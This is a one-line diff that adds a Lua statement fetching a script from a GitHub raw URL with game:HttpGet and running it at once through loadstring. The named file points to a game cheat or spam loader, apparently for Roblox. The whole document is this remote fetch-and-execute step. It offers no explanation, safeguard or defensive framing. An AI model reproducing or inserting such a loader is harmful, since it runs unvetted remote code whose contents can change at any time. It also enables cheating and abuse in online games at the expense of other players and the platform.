@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam2-amyx0pgoex8dpw.lua"))()
